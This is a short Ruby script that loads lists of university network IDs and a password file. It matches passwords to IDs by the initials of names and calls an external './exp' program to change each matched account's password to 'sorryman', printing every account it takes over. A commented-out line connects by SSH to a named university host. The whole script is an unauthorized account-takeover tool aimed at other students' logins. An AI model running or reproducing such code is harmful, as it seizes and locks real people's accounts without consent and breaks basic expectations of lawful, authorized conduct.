#!/usr/bin/env ruby
# -*- coding: utf-8 -*-
#

netidRe = /\w{3}[0-9]{3}/
netids = File.read("all-ids.txt").split.select {|s| s.match netidRe }
usedids = File.read("in-class.txt").split.select{|s| s.match netidRe }
netids -= usedids
passwords = File.read("passwords.txt").split



def change_login(username, password, newpass)
  system "./exp " +  [username,password,newpass].join(' ')
end

passwords.each do |pass|
  names = pass.scan /[A-Z]/
  pass.downcase!
  first = names[0].downcase
  last = names[1].downcase
#  puts first + ' ' + last
  ids = usedmatches = usedids.select {|netid| netid.match (first + '\w' + last)}
#  ids = netids.select {|netid| netid.match (first + '\w' + last)}
  if not ids.empty?
    puts pass
    puts ids
    ids.each do |id|
      if change_login(id, pass, 'sorryman')
        puts "Changed: #{id}'s pass to sorryman"
        break
      end
    end
  end
end


# command = "ssh #{ARGV[0]}@bane.eecs.northwestern.edu"
# puts command
# system command
